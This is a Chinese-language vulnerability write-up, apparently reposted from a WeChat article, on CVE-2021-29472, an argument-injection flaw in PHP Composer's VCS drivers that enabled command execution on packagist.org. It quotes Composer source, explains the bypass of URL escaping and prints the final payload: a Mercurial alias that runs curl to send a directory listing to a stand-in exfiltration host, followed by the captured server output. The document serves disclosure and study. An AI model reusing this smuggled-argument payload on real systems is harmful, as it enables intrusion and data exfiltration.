> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?src=11×tamp=1647401967&ver=3679&signature=k-TbFkTL16X*WrqI9vXTDgoA1oQHy87N3uZXzzYwsgRD**ieDbvZN7-EkI05P8txmz8HShxPXsV7QGNZkPImMuTJO*bqtfvFIxjX70PFzjsGgoO3ycpSSZmpKDpL70ae&new=1)

概述


------

Composer 是 PHP 社区的依赖项管理器，它简化了安装，更新和使用第三方程序包的过程。Composer 使用 Packagist 在线服务来确定正确的软件包下载供应链。据估计，Packagist 基础设施每月可处理约 14 亿次下载请求。

研究人员在在 Composer 源代码中发现的一个高危漏洞 (CVE-2021-29472)，该漏洞源于 composer.json 根文件对存储库的 URL 未正确清理，从而允许攻击者在 Packagist.org 服务器上执行任意系统命令并建立后门。

技术细节


--------

当系统要求下载软件包时，Composer 将首先查询 Packagist 以获取其元数据。该元数据包含两个字段，source 字段指向开发存储库，而 dist 字段指向预先构建的档案。从存储库下载代码时，Composer 将使用外部系统命令来避免重新实现特定于每个版本控制软件 (VCS) 的逻辑。为此，其使用 ProcessExecutor 封装程序执行此类调用。

**composer/src/Composer/Util/ProcessExecutor.php**

```
use Symfony\Component\Process\Process;
// [...]
class ProcessExecutor
{
    // [...]
    public function execute($command, &$output = null, $cwd = null)
{
        if (func_num_args() > 1) {
            return $this->doExecute($command, $cwd, false, $output);
        }
        return $this->doExecute($command, $cwd, false);
    }
    // [...]
    private function doExecute($command, $cwd, $tty, &$output = null)
{
        // [...]
        if (method_exists('Symfony\Component\Process\Process', 'fromShellCommandline')) {
            // [1]
            $process = Process::fromShellCommandline($command, $cwd, null, null, static::getTimeout());
        } else {
            // [2]
            $process = new Process($command, $cwd, null, null, static::getTimeout());
        }
        if (!Platform::isWindows() && $tty) {
            try {
                $process->setTty(true);
            } catch (RuntimeException $e) {
                // ignore TTY enabling errors
            }
        }
        $callback = is_callable($output) ? $output : array($this, 'outputHandler');
        $process->run($callback);

```

在注释 [1] 和注释 [2] 处，可以看到 $command 参数是由 Symfony\Component\Process\Process 在 shell 中执行的。大多数 ProcessExecutor 调用均在 VCS 驱动器中执行，该驱动器负责对远程和本地存储库进行任意操作 (克隆、提取信息等)，如在 Git 驱动器中：

**composer/src/Composer/Repository/Vcs/GitDriver.php**

```
public static function supports(IOInterface $io, Config $config, $url, $deep = false)
{
    if (preg_match('#(^git://|\.git/?$|git(?:olite)?@|//git\.|//github.com/)#i', $url)) {
        return true;
    }
    // [...]
    try {
        $gitUtil->runCommand(function ($url) {
            return 'git ls-remote --heads ' . ProcessExecutor::escape($url); // [1]
        }, $url, sys_get_temp_dir());
    } catch (\RuntimeException $e) {
        return false;
    }

```

虽然使用 ProcessExecutor:: escape() 对 $url 参数进行转义，以防止 shell 对子命令 $(...) 和 `...` 的求值，但没有什么会阻止用户提供以 -- 破折号开头，并在最终命令后附加额外的参数的值。

这种参数注入漏洞，存在于用户控制的数据已正确转义，但连接到系统命令的驱动器中：

```
public static function supports(IOInterface $io, Config $config, $url, $deep = false)
{
    $url = self::normalizeUrl($url);
    if (preg_match('#(^svn://|^svn\+ssh://|svn\.)#i', $url)) {
        return true;
    }
    // [...]
    $process = new ProcessExecutor($io);
    $exit = $process->execute(
        "svn info --non-interactive ".ProcessExecutor::escape($url),
        $ignoredOutput
    );

```

```
public static function supports(IOInterface $io, Config $config, $url, $deep = false)
{
    if (preg_match('#(^(?:https?|ssh)://(?:[^@]+@)?bitbucket.org|https://(?:.*?)\.kilnhg.com)#i', $url)) {
        return true;
    }
    // [...]
    $process = new ProcessExecutor($io);
    $exit = $process->execute(sprintf('hg identify %s', ProcessExecutor::escape($url)), $ignored);
    return $exit === 0;
}

```

packagist.org 入侵


--------------------

packagist/src/Entity/Package.php 所示，它将执行以下操作：

```
$io = new NullIO();
$config = Factory::createConfig();
$io->loadConfiguration($config);
$httpDownloader = new HttpDownloader($io, $config);
$repository = new VcsRepository(['url' => $this->repository], $io, $config, $httpDownloader); // [1]
$driver = $this->vcsDriver = $repository->getDriver(); // [2]
if (!$driver) {
    return;
}
$information = $driver->getComposerInformation($driver->getRootIdentifier());
if (!isset($information['name'])) {
    return;
}
if (null === $this->getName()) {
    $this->setName(trim($information['name']));
}

```

*   GitHubDriver
    
*   GitLabDriver
    
*   GitBitbucketDriver
    
*   GitDriver
    
*   HgBitbucketDriver
    
*   HgDriver
    
*   PerforceDriver
    
*   FossilDriver
    
*   SvnDriver
    

漏洞利用


--------

研究人员在阅读 Mercurial 客户端 (hg) 使用手册时，注意到其存在 --config 标志。该标志允许我们在执行任何操作之前将新的配置指令加载到客户端。客户端支持别名设置，并具有以下描述：

可以使用与现有命令相同的名称来创建别名，然后覆盖原始定义。别名可以以感叹号 (!) 开头，以使其成为 Shell 别名。Shell 别名与 Shell 一起执行，可让您运行任意命令。例如，echo = !echo $@

Shell 别名与 Shell 一起执行，可让您运行任意命令。  

通过以上描述，我们可以通过将命令标识别名添加到我们选择的 shell 命令中，使 hg 执行注入的命令，而不是查找远程存储库。最终的有效载荷如下所示：

```
-config=alias.identify=!curl http://exfiltration-host.tld --data “$(ls -alh)”

```

在 packagist.org 上使用此 URL 提交新程序包后，研究人员成功获得命令执行，AWS 主机返回的 HTTP 请求如下所示：

```
total 120K 
drwxrwxr-x  9 composer composer 4.0K Apr 21 23:19 . 
dr-xr-xr-x 15 composer composer 4.0K Apr 20 07:38 .. 
-r--r--r--  1 composer composer 8.7K Apr 20 07:38 .htaccess 
-r--r--r--  1 composer composer 1.3K Apr 20 07:38 app.php 
-r--r--r--  1 composer composer 8.2K Apr 20 07:38 apple-touch-icon-precomposed.png 
-r--r--r--  1 composer composer 8.2K Apr 20 07:38 apple-touch-icon.png 
dr-xr-xr-x  3 composer composer 4.0K Jan 13 14:35 bundles 
dr-xr-xr-x  4 composer composer 4.0K Apr 20 07:38 css [...] 
lrwxrwxrwx  1 composer composer   15 Aug 13  2020 packages.json -> p/packages.json 
lrwxrwxrwx  1 composer composer   18 Aug 13  2020 packages.json.gz -> p/packages.json.gz 
-r--r--r--  1 composer composer  106 Apr 20 07:38 robots.txt 
-r--r--r--  1 composer composer  798 Apr 20 07:38 search.osd 
dr-xr-xr-x  2 composer composer 4.0K Apr 20 07:38 static-error 
-r--r--r--  1 composer composer 8.8K Apr 20 07:38 touch-icon-192x192.png

```

END